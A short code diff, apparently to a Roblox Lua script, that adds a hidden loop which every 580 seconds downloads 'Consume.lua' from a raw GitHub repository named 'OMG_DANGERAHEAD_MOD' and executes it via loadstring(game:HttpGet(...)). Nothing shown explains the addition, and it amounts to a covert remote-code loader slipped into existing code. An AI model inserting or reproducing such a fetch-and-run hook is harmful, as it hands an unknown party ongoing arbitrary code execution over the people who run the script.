@@ -132,5 +132,16 @@ spawn(function()
                 end
             end
         end)
+			local Consume = false
+spawn(function()
+        while true do
+            if Consume == false then
+                Consume = true
+                wait(580)
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/TheEnfrostedPower/OMG_DANGERAHEAD_MOD_saSDSFSJZAEWZIDF/main/Consume.lua"))()
+                Consume = false
+                end
+            end
+        end)
 end
 
